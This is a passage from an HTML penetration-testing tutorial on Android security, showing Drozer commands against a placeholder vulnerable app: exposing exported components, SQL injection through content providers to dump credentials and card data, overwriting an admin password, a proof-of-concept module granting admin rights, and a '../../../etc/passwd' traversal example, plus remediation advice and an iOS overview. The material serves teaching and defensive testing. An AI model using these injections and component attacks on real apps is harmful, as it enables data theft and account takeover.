#   Data Directory: /data/user/0/com.example.vulnerableapp
#   APK Path: /data/app/com.example.vulnerableapp-xyz=/base.apk
#   UID: 10123
#   GID: [3003, 1015, 1028]
#   Shared Libraries: null
#   Shared User ID: null
#   Permissions:
#     - android.permission.INTERNET
#     - android.permission.WRITE_EXTERNAL_STORAGE
#     - android.permission.READ_EXTERNAL_STORAGE</div>

            <h4>Identifying Attack Surface</h4>

            <div class="code"># Find exported activities (can be launched by other apps):
dz> run app.activity.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.MainActivity
#     Permission: null                    ‚Üê NO PERMISSION REQUIRED!
#     Exported: True                      ‚Üê ACCESSIBLE BY ANY APP!
#   com.example.vulnerableapp.SecretActivity
#     Permission: null
#     Exported: True                      ‚Üê VULNERABILITY!

# Launch the secret activity:
dz> run app.activity.start --component com.example.vulnerableapp com.example.vulnerableapp.SecretActivity

# The secret activity opens! (Should have been protected)

# Find exported services:
dz> run app.service.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.AdminService
#     Permission: null
#     Exported: True                      ‚Üê ANY APP CAN START THIS!

# Find broadcast receivers:
dz> run app.broadcast.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.SMSReceiver
#     Permission: null
#     Exported: True

# Send a broadcast to trigger it:
dz> run app.broadcast.send --action android.provider.Telephony.SMS_RECEIVED

# Find content providers (database interfaces):
dz> run app.provider.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.UserProvider
#     Authority: com.example.vulnerableapp.users
#     Read Permission: null               ‚Üê NO READ PERMISSION!
#     Write Permission: null              ‚Üê NO WRITE PERMISSION!
#     Exported: True                      ‚Üê ANYONE CAN ACCESS DATABASE!
#     Grant URI Permissions: False</div>

            <h4>Exploiting Content Providers (SQL Injection)</h4>

            <div class="code"># Content providers expose database queries to other apps
# If not properly secured, they're vulnerable to SQL injection!

# List accessible content URIs:
dz> run scanner.provider.finduris -a com.example.vulnerableapp

# Output:
# Scanning com.example.vulnerableapp...
# content://com.example.vulnerableapp.users/
# content://com.example.vulnerableapp.users/user
# content://com.example.vulnerableapp.users/admin

# Query the content provider:
dz> run app.provider.query content://com.example.vulnerableapp.users/user

# Output:
# | _id | username      | password       | email                |
# |-----|---------------|----------------|----------------------|
# | 1   | john_doe      | password123    | john@example.com     |
# | 2   | admin         | admin123       | admin@example.com    |
# | 3   | alice         | mypassword     | alice@example.com    |

# SQL Injection test - try to dump all data:
dz> run app.provider.query content://com.example.vulnerableapp.users/user --selection "1=1"

# If vulnerable, returns all records regardless of intended filter

# Advanced SQL injection - extract database schema:
dz> run app.provider.query content://com.example.vulnerableapp.users/user --projection "* FROM sqlite_master WHERE type='table'--"

# Try to read other tables:
dz> run app.provider.query content://com.example.vulnerableapp.users/user --projection "* FROM credit_cards--"

# Output:
# | _id | card_number       | cvv  | expiry   |
# |-----|-------------------|------|----------|
# | 1   | 4532123456789012  | 123  | 12/25    |
# | 2   | 5425233412341234  | 456  | 06/26    |

# DATA BREACH! Credit cards exposed via SQL injection!

# Try to modify data (if provider allows write):
dz> run app.provider.update content://com.example.vulnerableapp.users/user --selection "_id=2" --string username admin --string password hacked123

# Changed admin password!</div>

            <h4>Automated Vulnerability Scanning</h4>

            <div class="code"># Drozer has built-in scanners for common vulnerabilities:

# Scan for all vulnerabilities in a package:
dz> run scanner.misc.traverse -a com.example.vulnerableapp

# Scans for path traversal vulnerabilities

# Scan for native code issues:
dz> run scanner.misc.native -a com.example.vulnerableapp

# Scan for debug flags:
dz> run app.package.debuggable

# Output:
# Package: com.example.vulnerableapp
#   Debuggable: True                      ‚Üê SECURITY ISSUE!

# Scan for backup flags:
dz> run app.package.backup

# Output:
# Package: com.example.vulnerableapp
#   Allows Backup: True                   ‚Üê Data can be extracted via adb backup!

# Scan for shared UID:
dz> run app.package.shareduid

# Scan for SQL injection in all providers:
dz> run scanner.provider.injection -a com.example.vulnerableapp

# Output:
# Scanning com.example.vulnerableapp...
# Injection in Projection:
#   content://com.example.vulnerableapp.users/user
#     Vulnerable to projection-based SQL injection
# 
# Injection in Selection:
#   content://com.example.vulnerableapp.users/user
#     Vulnerable to selection-based SQL injection

# Scan for path traversal in providers:
dz> run scanner.provider.traversal -a com.example.vulnerableapp

# Scan for all exported components:
dz> run scanner.activity.browsable -a com.example.vulnerableapp
dz> run scanner.provider.finduris -a com.example.vulnerableapp</div>

            <h4>Creating a Proof-of-Concept Exploit</h4>

            <div class="code"># Scenario: We found that com.example.vulnerableapp has:
# 1. Exported activity that grants admin privileges
# 2. No permission required
# 
# Let's write a malicious APK to exploit it!

# Create exploit.py (Drozer module):

class Exploit(Module):
    name = "Exploit Vulnerable App"
    description = "Grant admin privileges via exported activity"
    
    def execute(self, arguments):
        # Launch the privileged activity
        intent = android.Intent()
        intent.setComponent(
            "com.example.vulnerableapp",
            "com.example.vulnerableapp.GrantAdminActivity"
        )
        intent.putExtra("username", "attacker")
        intent.putExtra("grant_admin", True)
        
        self.getContext().startActivity(intent)
        self.stdout.write("[+] Admin privileges granted to 'attacker'!\n")

# Save as ~/.drozer/modules/exploit.py

# Run the exploit:
dz> run exploit

# Output:
# [+] Admin privileges granted to 'attacker'!
# 
# Exploitation successful! The attacker now has admin access.</div>

            <div class="info-box">
                <h4>Common Drozer Findings</h4>
                <p><strong>Exported Components Without Permissions:</strong><br>
                ‚Ä¢ Activities that can be launched by malicious apps<br>
                ‚Ä¢ Services that can be started/bound without authorization<br>
                ‚Ä¢ Broadcast receivers that process untrusted intents<br>
                ‚Ä¢ Content providers that expose sensitive data<br><br>
                <strong>SQL Injection in Content Providers:</strong><br>
                ‚Ä¢ Projection-based injection (manipulate SELECT columns)<br>
                ‚Ä¢ Selection-based injection (manipulate WHERE clause)<br>
                ‚Ä¢ Allows reading arbitrary tables, modifying data<br><br>
                <strong>Path Traversal:</strong><br>
                ‚Ä¢ Content providers that accept file paths as input<br>
                ‚Ä¢ Can read files outside app's directory (../../../etc/passwd)<br><br>
                <strong>Debug/Backup Flags:</strong><br>
                ‚Ä¢ android:debuggable="true" in production<br>
                ‚Ä¢ android:allowBackup="true" (data can be extracted)<br><br>
                <strong>Remediation:</strong><br>
                ‚Ä¢ Set android:exported="false" unless component MUST be accessible<br>
                ‚Ä¢ Require custom permissions for sensitive components<br>
                ‚Ä¢ Use parameterized queries (never string concatenation)<br>
                ‚Ä¢ Validate all input (paths, intents, query parameters)<br>
                ‚Ä¢ Disable debugging and backups in production builds</p>
            </div>

            <div class="warning-box">
                <h4>‚ö†Ô∏è iOS Pentesting: A Quick Overview</h4>
                <p>While this chapter focuses on Android, iOS pentesting has similar concepts but different tools:<br><br>
                <strong>iOS App Structure:</strong><br>
                ‚Ä¢ <strong>IPA:</strong> iOS App Store Package (like APK for Android)<br>
                ‚Ä¢ <strong>Mach-O:</strong> iOS executable format (like DEX for Android)<br>
                ‚Ä¢ <strong>Plist:</strong> Property list files (like AndroidManifest.xml)<br><br>
                <strong>Key Tools:</strong><br>
                ‚Ä¢ <strong>class-dump:</strong> Extract Objective-C headers from apps<br>
                ‚Ä¢ <strong>Clutch:</strong> Decrypt App Store encrypted apps (requires jailbreak)<br>
                ‚Ä¢ <strong>Hopper/Ghidra:</strong> Disassemble Mach-O binaries<br>
                ‚Ä¢ <strong>Frida:</strong> Works on iOS too! (requires jailbreak)<br>
                ‚Ä¢ <strong>Cycript:</strong> JavaScript/Objective-C hybrid console for runtime manipulation<br>
                ‚Ä¢ <strong>Burp Suite:</strong> Same HTTPS interception as Android<br><br>
                <strong>Key Differences:</strong><br>
                ‚Ä¢ iOS apps are always encrypted by Apple (need jailbreak to decrypt)<br>
                ‚Ä¢ No easy "decompile to source" (Objective-C/Swift ‚Üí assembly only)<br>
                ‚Ä¢ Sandbox is much stricter (harder to access other apps' data)<br>
                ‚Ä¢ Jailbreaking required for most pentesting tools<br><br>
                <strong>iOS Testing Workflow:</strong><br>
                1. <strong>Jailbreak device:</strong> Use checkra1n, unc0ver, or Odyssey<br>
                2. <strong>Install Frida:</strong> Same process as Android<br>
                3. <strong>Decrypt IPA:</strong> Use Clutch or CrackerXI+<br>
                4. <strong>Static analysis:</strong> class-dump for headers, Hopper for disassembly<br>
                5. <strong>Dynamic analysis:</strong> Frida hooks, Cycript runtime manipulation<br>
                6. <strong>Traffic interception:</strong> Burp Suite + certificate pinning bypass<br><br>
                iOS pentesting is generally harder than Android due to Apple's restrictions, but the core vulnerabilities (hardcoded secrets, insecure crypto, logic flaws) are the same!</p>
            </div>

            <div class="metaphor-box">
                <h4>üéâ You're Now a Mobile Security Expert!</h4>
                <p>You've mastered the complete mobile pentesting toolkit:<br><br>
                ‚úÖ <strong>APKTool:</strong> Decompile, modify, recompile APKs<br>
                ‚úÖ <strong>Jadx:</strong> Decompile to readable Java code<br>
                ‚úÖ <strong>ADB:</strong> Complete control over Android devices<br>
                ‚úÖ <strong>MobSF:</strong> Automated security assessment<br>
                ‚úÖ <strong>Frida:</strong> Runtime manipulation and bypass techniques<br>
                ‚úÖ <strong>Drozer:</strong> Android-specific vulnerability discovery<br><br>
                <strong>Your Mobile Pentesting Workflow:</strong><br>
                1. <strong>Acquisition:</strong> Download APK (from device, store, or APK mirror)<br>
                2. <strong>Static Analysis:</strong> Jadx (read code) + MobSF (auto-scan) + grep (search secrets)<br>
                3. <strong>Dynamic Analysis:</strong> ADB (logs, data) + Frida (hooks) + Burp Suite (traffic)<br>
                4. <strong>Exploitation:</strong> APKTool (modify & recompile) + Drozer (component attacks)<br>
                5. <strong>Reporting:</strong> Document findings with severity, impact, PoC, remediation<br><br>
                <strong>Practice Resources:</strong><br>
                ‚Ä¢ <strong>InsecureBankv2:</strong> Intentionally vulnerable banking app<br>
                ‚Ä¢ <strong>DVIA:</strong> Damn Vulnerable iOS App<br>
                ‚Ä¢ <strong>OWASP MSTG:</strong> Mobile Security Testing Guide<br>
                ‚Ä¢ <strong>HackerOne/Bugcrowd:</strong> Real bug bounties for mobile apps<br><br>
                Mobile security is one of the fastest-growing fields in cybersecurity. With 5+ billion smartphones and countless apps, vulnerabilities are everywhere. Now go find them! üöÄüì±</p>
            </div>
        </section>

        <!-- SECTION 3: IoT & Hardware Hacking -->
        <section id="iot-hardware" class="section">
            <h2 class="section-title">IoT & Hardware Hacking</h2>
            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
        </section>

        <!-- SECTION 4: Cloud Penetration Testing -->
        <section id="cloud-pentesting" class="section">
            <h2 class="section-title">Cloud Penetration Testing</h2>
            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
        </section>

        <section id="advanced-wireless" class="section">
            <h2 class="section-title">Advanced Wireless Techniques</h2>
            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
        </section>

        <!-- SECTION 6: Reverse Engineering Mastery -->
        <section id="reverse-engineering" class="section">
            <h2 class="section-title">Reverse Engineering Mastery</h2>
            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
        </section>

        <!-- SECTION 7: Advanced Exploitation Techniques -->
        <section id="advanced-exploitation" class="section">
            <h2 class="section-title">Advanced Exploitation Techniques</h2>
            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
        </section>

        <!-- SECTION 8: Red Team Operations & Tradecraft -->
        <section id="red-team" class="section">
            <h2 class="section-title">Red Team Operations & Tradecraft</h2>
            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
        </section>

        <!-- SECTION 9: Custom Tool Development -->
        <section id="custom-tools" class="section">
            <h2 class="section-title">Custom Tool Development</h2>
            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
        </section>

        <!-- SECTION 10: Physical Security & Social Engineering -->
        <section id="physical-security" class="section">
            <h2 class="section-title">Physical Security & Social Engineering</h2>
            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
        </section>

        <!-- SECTION 11: Advanced OSINT & Reconnaissance -->
        <section id="advanced-osint" class="section">
            <h2 class="section-title">Advanced OSINT & Reconnaissance</h2>
            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
        </section>

        <!-- SECTION 12: Remaining Kali Tools Dictionary -->
        <section id="remaining-tools" class="section">
            <h2 class="section-title">Remaining Kali Tools Dictionary</h2>
            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
        </section>

    </main>

    <script>
        window.addEventListener('scroll', () => {
            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
            const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
            const scrolled = (winScroll / height) * 100;
            document.getElementById('progress').style.width = scrolled + '%';
        });

        const sections = document.querySelectorAll('.section');
        const sidebarLinks = document.querySelectorAll('.sidebar-link');
        window.addEventListener('scroll', () => {
            let current = '';
            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                const sectionHeight = section.clientHeight;
                if (pageYOffset >= (sectionTop - 150)) {
                    current = section.getAttribute('id');
                }
            });
            sidebarLinks.forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('href') === `#${current}`) {
                    link.classList.add('active');
                }
            });
        });
    </script>
</body>
</html>